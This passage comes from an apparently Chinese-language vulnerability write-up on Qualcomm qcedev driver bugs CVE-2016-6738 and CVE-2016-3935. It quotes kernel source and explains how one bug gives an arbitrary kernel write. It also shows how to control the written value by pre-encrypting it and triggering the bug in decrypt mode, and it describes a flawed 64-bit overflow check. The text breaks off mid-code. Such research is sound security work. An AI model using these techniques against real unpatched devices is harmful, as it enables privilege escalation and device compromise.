class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">                        k_align_dst += creq-&gt;vbuf.dst[dst_i].len +</span><br><span class="line">                                                byteoffset;</span><br><span class="line">                        creq-&gt;data_len -= creq-&gt;vbuf.dst[dst_i].len;</span><br><span class="line">                        dst_i++;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="keyword">if</span> (err == <span class="number">0</span> &amp;&amp; __copy_to_user(</span><br><span class="line">                                (<span class="keyword">void</span> __user *)creq-&gt;vbuf.dst[dst_i].vaddr,</span><br><span class="line">                                (k_align_dst + byteoffset),</span><br><span class="line">                                creq-&gt;data_len))</span><br><span class="line">                                        <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">                        k_align_dst += creq-&gt;data_len;</span><br><span class="line">                        creq-&gt;vbuf.dst[dst_i].len -= creq-&gt;data_len;</span><br><span class="line">                        creq-&gt;vbuf.dst[dst_i].vaddr += creq-&gt;data_len;</span><br><span class="line">                        creq-&gt;data_len = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        *di = dst_i;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> err;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>在函数 <strong>qcedev_vbuf_ablk_cipher_max_xfer</strong> 里，我们发现它没有再用到变量 <strong>creq-&gt;in_place_op</strong>， 也没有对地址 creq-&gt;vbuf.dst[i].vaddr 做校验，我们还可以看到该函数最后是使用 <strong>__copy_to_user</strong> 而不是 copy_to_user 从变量 k_align_dst 拷贝数据到地址 creq-&gt;vbuf.dst[i].vaddr</p>
<p>由于** <strong>copy_to_user** 本质上只是 memcpy, 且 **</strong>copy_to_user** 的目标地址是 creq-&gt;vbuf.dst[dst_i].vaddr, 这个地址可以被用户态控制， 这样漏洞就坐实了，我们得到了一个内核任意地址写漏洞。</p>
<p>接下去我们看一下能写什么值</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">file: drivers/crypto/msm/qcedev.c</span><br><span class="line"><span class="keyword">while</span> (creq-&gt;data_len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (creq-&gt;vbuf.dst[dst_i].len &lt;= creq-&gt;data_len) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (err == <span class="number">0</span> &amp;&amp; __copy_to_user(</span><br><span class="line">                                (<span class="keyword">void</span> __user *)creq-&gt;vbuf.dst[dst_i].vaddr,</span><br><span class="line">                                        (k_align_dst + byteoffset),</span><br><span class="line">                                        creq-&gt;vbuf.dst[dst_i].len))</span><br><span class="line">                                        <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">                        k_align_dst += creq-&gt;vbuf.dst[dst_i].len +</span><br><span class="line">                                                byteoffset;</span><br><span class="line">                        creq-&gt;data_len -= creq-&gt;vbuf.dst[dst_i].len;</span><br><span class="line">                        dst_i++;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br></pre></td></tr></table></figure>

<p>再看一下漏洞触发的地方，源地址是 <strong>k_align_dst</strong> ，这是一个局部变量，下面看这个地址的内容能否控制。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">qcedev_vbuf_ablk_cipher_max_xfer</span><span class="params">(struct qcedev_async_req *areq,</span></span></span><br><span class="line"><span class="function"><span class="params">                                <span class="keyword">int</span> *di, struct qcedev_handle *handle,</span></span></span><br><span class="line"><span class="function"><span class="params">                                <span class="keyword">uint8_t</span> *k_align_src)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> err = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> dst_i = *di;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">scatterlist</span> <span class="title">sg_src</span>;</span></span><br><span class="line">        <span class="keyword">uint32_t</span> byteoffset = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">uint8_t</span> *user_src = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">uint8_t</span> *k_align_dst = k_align_src;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span>  <span class="title">qcedev_cipher_op_req</span> *<span class="title">creq</span> = &amp;<span class="title">areq</span>-&gt;<span class="title">cipher_op_req</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (areq-&gt;cipher_op_req.mode == QCEDEV_AES_MODE_CTR)</span><br><span class="line">                byteoffset = areq-&gt;cipher_op_req.byteoffset;</span><br><span class="line"></span><br><span class="line">        user_src = (<span class="keyword">void</span> __user *)areq-&gt;cipher_op_req.vbuf.src[<span class="number">0</span>].vaddr;</span><br><span class="line">        <span class="keyword">if</span> (user_src &amp;&amp; __copy_from_user((k_align_src + byteoffset), <span class="comment">// line 1160</span></span><br><span class="line">                                (<span class="keyword">void</span> __user *)user_src,</span><br><span class="line">                                areq-&gt;cipher_op_req.vbuf.src[<span class="number">0</span>].len))</span><br><span class="line">                <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">        k_align_src += byteoffset + areq-&gt;cipher_op_req.vbuf.src[<span class="number">0</span>].len;</span><br></pre></td></tr></table></figure>

<p>在函数 <strong>qcedev_vbuf_ablk_cipher_max_xfer</strong> 的行 1160 可以看到，变量 <strong>k_align_dst</strong> 的值是从用户态地址拷贝过来的，可以被控制，但是，还没完</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1178</span>         <span class="comment">/* restore src beginning */</span></span><br><span class="line"><span class="number">1179</span>         k_align_src = k_align_dst;</span><br><span class="line"><span class="number">1180</span>         areq-&gt;cipher_op_req.data_len += byteoffset;</span><br><span class="line"><span class="number">1181</span> </span><br><span class="line"><span class="number">1182</span>         areq-&gt;cipher_req.creq.src = (struct scatterlist *) &amp;sg_src;</span><br><span class="line"><span class="number">1183</span>         areq-&gt;cipher_req.creq.dst = (struct scatterlist *) &amp;sg_src;</span><br><span class="line"><span class="number">1184</span> </span><br><span class="line"><span class="number">1185</span>         <span class="comment">/* In place encryption/decryption */</span></span><br><span class="line"><span class="number">1186</span>         sg_set_buf(areq-&gt;cipher_req.creq.src,</span><br><span class="line"><span class="number">1187</span>                                         k_align_dst,</span><br><span class="line"><span class="number">1188</span>                                         areq-&gt;cipher_op_req.data_len);</span><br><span class="line"><span class="number">1189</span>         sg_mark_end(areq-&gt;cipher_req.creq.src);</span><br><span class="line"><span class="number">1190</span> </span><br><span class="line"><span class="number">1191</span>         areq-&gt;cipher_req.creq.nbytes = areq-&gt;cipher_op_req.data_len;</span><br><span class="line"><span class="number">1192</span>         areq-&gt;cipher_req.creq.info = areq-&gt;cipher_op_req.iv;</span><br><span class="line"><span class="number">1193</span>         areq-&gt;cipher_op_req.entries = <span class="number">1</span>;</span><br><span class="line"><span class="number">1194</span> </span><br><span class="line"><span class="number">1195</span>         err = submit_req(areq, handle);</span><br><span class="line"><span class="number">1196</span> </span><br><span class="line"><span class="number">1197</span>         <span class="comment">/* copy data to destination buffer*/</span></span><br><span class="line"><span class="number">1198</span>         creq-&gt;data_len -= byteoffset;</span><br></pre></td></tr></table></figure>

<p>行1195调用函数 <strong>submit_req</strong> ，这个函数的作用是提交一个 buffer 给高通加解密引擎进行加解密，buffer 的设置由函数 <strong>sg_set_buf</strong> 完成，通过行 1186 可以看到，变量 <strong>k_align_dst</strong> 就是被传进去的 buffer , 经过这个操作后， 变量  <strong>k_align_dst</strong> 的值会被改变, 即我们通过__copy_to_user 传递给 creq-&gt;vbuf.dst[dst_i].vaddr 的值是被加密或者解密过一次的值。</p>
<p>那么我们怎么控制最终写到任意地址的那个值呢？</p>
<p>思路很直接，<code>我们将要写的值先用一个秘钥和算法加密一次，然后再用解密的模式触发漏洞，在漏洞触发过程中，会自动解密</code>，如下：</p>
<p>1) 假设我们最终要写的数据是A, 我们先选一个加密算法和key进行加密</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">buf = A</span><br><span class="line">op = QCEDEV_OPER_ENC  <span class="comment">// operation 为加密</span></span><br><span class="line">alg = QCEDEV_ALG_DES <span class="comment">// 算法</span></span><br><span class="line">mode = QCEDEV_DES_MODE_ECB</span><br><span class="line">key = xxx  <span class="comment">// 秘钥</span></span><br><span class="line"></span><br><span class="line">=&gt;  B</span><br></pre></td></tr></table></figure>
<p>2) 然后将B作为参数传入 <strong>qcedev_vbuf_ablk_cipher_max_xfer</strong> 函数触发漏洞，同时参数设置为解密操作，并且传入同样的解密算法和key</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">buf = B</span><br><span class="line">op = QCEDEV_OPER_DEC <span class="comment">//// operation 为解密</span></span><br><span class="line">alg = QCEDEV_ALG_DES <span class="comment">// 一样的算法</span></span><br><span class="line">mode = QCEDEV_DES_MODE_ECB</span><br><span class="line">key = xxx <span class="comment">// 一样的秘钥</span></span><br><span class="line"></span><br><span class="line">=&gt; A</span><br></pre></td></tr></table></figure>
<p>这样的话，经过 <strong>submit_req</strong> 操作后， line 1204 得到的  k_align_dst 就是我们需要的数据。</p>
<p>至此，我们得到了一个<code>任意地址写任意值的漏洞</code>。</p>
<h3 id="CVE-2016-6738-漏洞补丁"><a href="#CVE-2016-6738-漏洞补丁" class="headerlink" title="CVE-2016-6738 漏洞补丁 [^]"></a>CVE-2016-6738 漏洞补丁 <a href="#top">[^]</a></h3><p><span id="CVE-2016-6738-patch"></span> </p>
<p>这个 <a href="https://source.codeaurora.org/quic/la//kernel/msm-3.18/commit/?id=0a2528569b035a2ca8ebe9a4612dbbaaaffa5b2e" target="_blank" rel="noopener">漏洞的修复</a> 很直观，将 <strong>in_place_op</strong> 的判断去掉了，对 creq-&gt;vbuf.src  和 creq-&gt;vbuf.dst 两个数组里的地址挨个进行 access_ok 校验</p>
<p>下面看第二个漏洞</p>
<h3 id="CVE-2016-3935-漏洞成因"><a href="#CVE-2016-3935-漏洞成因" class="headerlink" title="CVE-2016-3935 漏洞成因 [^]"></a>CVE-2016-3935 漏洞成因 <a href="#top">[^]</a></h3><p><span id="CVE-2016-3935-cause"></span></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">qcedev_ioctl</span><span class="params">(struct file *file, <span class="keyword">unsigned</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">...</span><br><span class="line">        <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">...</span><br><span class="line">        <span class="keyword">case</span> QCEDEV_IOCTL_SHA_INIT_REQ:</span><br><span class="line">                &#123;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">scatterlist</span> <span class="title">sg_src</span>;</span></span><br><span class="line">                <span class="keyword">if</span> (!access_ok(VERIFY_WRITE, (<span class="keyword">void</span> __user *)arg,</span><br><span class="line">                                <span class="keyword">sizeof</span>(struct qcedev_sha_op_req)))</span><br><span class="line">                        <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (__copy_from_user(&amp;qcedev_areq.sha_op_req,</span><br><span class="line">                                        (<span class="keyword">void</span> __user *)arg,</span><br><span class="line">                                        <span class="keyword">sizeof</span>(struct qcedev_sha_op_req)))</span><br><span class="line">                        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">                <span class="keyword">if</span> (qcedev_check_sha_params(&amp;qcedev_areq.sha_op_req, podev))</span><br><span class="line">                        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">...</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">...</span><br><span class="line">        <span class="keyword">case</span> QCEDEV_IOCTL_SHA_UPDATE_REQ:</span><br><span class="line">                &#123;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">scatterlist</span> <span class="title">sg_src</span>;</span></span><br><span class="line">                <span class="keyword">if</span> (!access_ok(VERIFY_WRITE, (<span class="keyword">void</span> __user *)arg,</span><br><span class="line">                                <span class="keyword">sizeof</span>(struct qcedev_sha_op_req)))</span><br><span class="line">                        <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (__copy_from_user(&amp;qcedev_areq.sha_op_req,</span><br><span class="line">                                        (<span class="keyword">void</span> __user *)arg,</span><br><span class="line">                                        <span class="keyword">sizeof</span>(struct qcedev_sha_op_req)))</span><br><span class="line">                        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">                <span class="keyword">if</span> (qcedev_check_sha_params(&amp;qcedev_areq.sha_op_req, podev))</span><br><span class="line">                        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">...</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">...</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">return</span> -ENOTTY;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 command 为下面几个case 里都会调用 <strong>qcedev_check_sha_params</strong> 函数对用户态传入的数据进行合法性校验</p>
<ul>
<li>QCEDEV_IOCTL_SHA_INIT_REQ</li>
<li>QCEDEV_IOCTL_SHA_UPDATE_REQ</li>
<li>QCEDEV_IOCTL_SHA_FINAL_REQ</li>
<li>QCEDEV_IOCTL_GET_SHA_REQ</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">qcedev_check_sha_params</span><span class="params">(struct qcedev_sha_op_req *req,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                struct qcedev_control *podev)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">uint32_t</span> total = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">uint32_t</span> i;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Check for sum of all src length is equal to data_len  */</span></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>, total = <span class="number">0</span>; i &lt; req-&gt;entries; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (req-&gt;data[i].len &gt; ULONG_MAX - total) &#123;</span><br><span class="line">                        pr_err(<span class="string">"%s: Integer overflow on total req buf length\n"</span>,</span><br><span class="line">                                __func__);</span><br><span class="line">                        <span class="keyword">goto</span> sha_error;</span><br><span class="line">                &#125;</span><br><span class="line">                total += req-&gt;data[i].len;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (total != req-&gt;data_len) &#123;</span><br><span class="line">                pr_err(<span class="string">"%s: Total src(%d) buf size != data_len (%d)\n"</span>,</span><br><span class="line">                        __func__, total, req-&gt;data_len);</span><br><span class="line">                <span class="keyword">goto</span> sha_error;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">sha_error:</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>qcedev_check_sha_params</strong> 对用户态传入的数据做多种校验，其中一项是对传入的数据数组挨个累加长度，并对总长度做整数溢出校验</p>
<p>问题在于， <strong>req-&gt;data[i].len</strong> 是 uint32_t 类型， 总长度 <strong>total</strong> 也是 uint32_t 类型，uint32_t 的上限是 UINT_MAX, 而这里使用了 ULONG_MAX 来做校验</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">usr/include/limits.h</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Maximum value an `unsigned long int' can hold.  (Minimum is 0.)  */</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">if</span> __WORDSIZE == 64</span></span><br><span class="line"><span class="meta">#   <span class="meta-keyword">define</span> ULONG_MAX    18446744073709551615UL</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#   <span class="meta-keyword">define</span> ULONG_MAX    4294967295UL</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>注意到：</p>
<ul>
<li>32 bit 系统， <strong>UINT_MAX = ULONG_MAX</strong></li>
<li>64 bit 系统， <strong>UINT_MAX ！= ULONG_MAX</strong></li>
</ul>
<p>所以这里的整数溢出校验 <code>在64bit系统是无效的</code>，即在 64bit 系统，req-&gt;data 数组项的总长度可以整数溢出，这里还无法确定这个整数溢出能造成什么后果。</p>
<p>下面看看有何影响，我们选取 case <strong>QCEDEV_IOCTL_SHA_UPDATE_REQ</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">qcedev_ioctl</span><span class="params">(struct file *file, <span class="keyword">unsigned</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">...     </span><br><span class="line">        <span class="keyword">case</span> QCEDEV_IOCTL_SHA_UPDATE_REQ:</span><br><span class="line">                &#123;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">scatterlist</span> <span class="title">sg_src</span>;</span></span><br><span class="line">                <span class="keyword">if</span> (!access_ok(VERIFY_WRITE, (<span class="keyword">void</span> __user *)arg,</span><br><span class="line">                                <span class="keyword">sizeof</span>(struct qcedev_sha_op_req)))</span><br><span class="line">                        <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (__copy_from_user(&amp;qcedev_areq.sha_op_req,</span><br><span class="line">                                        (<span class="keyword">void</span> __user *)arg,</span><br><span class="line">                                        <span class="keyword">sizeof</span>(struct qcedev_sha_op_req)))</span><br><span class="line">                        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">                <span class="keyword">if</span> (qcedev_check_sha_params(&amp;qcedev_areq.sha_op_req, podev))</span><br><span class="line">                        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">                qcedev_areq.op_type = QCEDEV_CRYPTO_OPER_SHA;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (qcedev_areq.sha_op_req.alg == QCEDEV_ALG_AES_CMAC) &#123;</span><br><span class="line">                        err = qcedev_hash_cmac(&amp;qcedev_areq, handle, &amp;sg_src);</span><br><span class="line">                        <span class="keyword">if</span> (err)</span><br><span class="line">                                <span class="keyword">return</span> err;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (handle-&gt;sha_ctxt.init_done == <span class="literal">false</span>) &#123; </span><br><span class="line">                                pr_err(<span class="string">"%s Init was not called\n"</span>, __func__);</span><br><span class="line">                                <span class="keyword">return</span> -EINVAL;</span><br><span class="line">                        &#125;</span><br><span class="line">                        err = qcedev_hash_update(&amp;qcedev_areq, handle, &amp;sg_src);</span><br><span class="line">                        <span class="keyword">if</span> (err)</span><br><span class="line">                                <span class="keyword">return</span> err;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">memcpy</span>(&amp;qcedev_areq.sha_op_req.digest[<span class="number">0</span>],</span><br><span class="line">                                &amp;handle-&gt;sha_ctxt.digest[<span class="number">0</span>],</span><br><span class="line">                                handle-&gt;sha_ctxt.diglen);</span><br><span class="line">                <span class="keyword">if</span> (__copy_to_user((<span class="keyword">void</span> __user *)arg, &amp;qcedev_areq.sha_op_req,</span><br><span class="line">                                        <span class="keyword">sizeof</span>(struct qcedev_sha_op_req)))</span><br><span class="line">                        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">...</span><br><span class="line">        <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>qcedev_areq.sha_op_req.alg</strong> 的值也是应用层控制的，当等于 <strong>QCEDEV_ALG_AES_CMAC</strong> 时，进入函数 <strong>qcedev_hash_cmac</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> <span class="number">868</span> <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">qcedev_hash_cmac</span><span class="params">(struct qcedev_async_req *qcedev_areq,</span></span></span><br><span class="line"><span class="function"><span class="params"> <span class="number">869</span>                                         struct qcedev_handle *handle,</span></span></span><br><span class="line"><span class="function"><span class="params"> <span class="number">870</span>                                         struct scatterlist *sg_src)</span></span></span><br><span class="line"><span class="function"> 871 </span>&#123;</span><br><span class="line"> <span class="number">872</span>         <span class="keyword">int</span> err = <span class="number">0</span>;</span><br><span class="line"> <span class="number">873</span>         <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"> <span class="number">874</span>         <span class="keyword">uint32_t</span> total;</span><br><span class="line"> <span class="number">875</span> </span><br><span class="line"> <span class="number">876</span>         <span class="keyword">uint8_t</span> *user_src = <span class="literal">NULL</span>;</span><br><span class="line"> <span class="number">877</span>         <span class="keyword">uint8_t</span> *k_src = <span class="literal">NULL</span>;</span><br><span class="line"> <span class="number">878</span>         <span class="keyword">uint8_t</span> *k_buf_src = <span class="literal">NULL</span>;</span><br><span class="line"> <span class="number">879</span> </span><br><span class="line"> <span class="number">880</span>         total = qcedev_areq-&gt;sha_op_req.data_len;</span><br><span class="line"> <span class="number">881</span> </span><br><span class="line"> <span class="number">882</span>         <span class="comment">/* verify address src(s) */</span></span><br><span class="line"> <span class="number">883</span>         <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; qcedev_areq-&gt;sha_op_req.entries; i++)</span><br><span class="line"> <span class="number">884</span>                 <span class="keyword">if</span> (!access_ok(VERIFY_READ,</span><br><span class="line"> <span class="number">885</span>                         (<span class="keyword">void</span> __user *)qcedev_areq-&gt;sha_op_req.data[i].vaddr,</span><br><span class="line"> <span class="number">886</span>                         qcedev_areq-&gt;sha_op_req.data[i].len))</span><br><span class="line"> <span class="number">887</span>                         <span class="keyword">return</span> -EFAULT;</span><br><span class="line"> <span class="number">888</span> </span><br><span class="line"> <span class="number">889</span>         <span class="comment">/* Verify Source Address */</span></span><br><span class="line"> <span class="number">890</span>         <span class="keyword">if</span> (!access_ok(VERIFY_READ,</span><br><span class="line"> <span class="number">891</span>                                 (<span class="keyword">void</span> __user *)qcedev_areq-&gt;sha_op_req.authkey,</span><br><span class="line"> <span class="number">892</span>                                 qcedev_areq-&gt;sha_op_req.authklen))</span><br><span class="line"> <span class="number">893</span>                         <span class="keyword">return</span> -EFAULT;</span><br><span class="line"> <span class="number">894</span>         <span class="keyword">if</span> (__copy_from_user(&amp;handle-&gt;sha_ctxt.authkey[<span class="number">0</span>],</span><br><span class="line"> <span class="number">895</span>                                 (<span class="keyword">void</span> __user *)qcedev_areq-&gt;sha_op_req.authkey,</span><br><span class="line"> <span class="number">896</span>                                 qcedev_areq-&gt;sha_op_req.authklen))</span><br><span class="line"> <span class="number">897</span>                 <span class="keyword">return</span> -EFAULT;</span><br><span class="line"> <span class="number">898</span> </span><br><span class="line"> <span class="number">899</span> </span><br><span class="line"> <span class="number">900</span>         k_buf_src = kmalloc(total, GFP_KERNEL);</span><br><span class="line"> <span class="number">901</span>         <span class="keyword">if</span> (k_buf_src == <span class="literal">NULL</span>) &#123;</span><br><span class="line"> <span class="number">902</span>                 pr_err(<span class="string">"%s: Can't Allocate memory: k_buf_src 0x%lx\n"</span>,</span><br><span class="line"> <span class="number">903</span>                                 __func__, (<span class="keyword">uintptr_t</span>)k_buf_src);</span><br><span class="line"> <span class="number">904</span>                 <span class="keyword">return</span> -ENOMEM;</span><br><span class="line"> <span 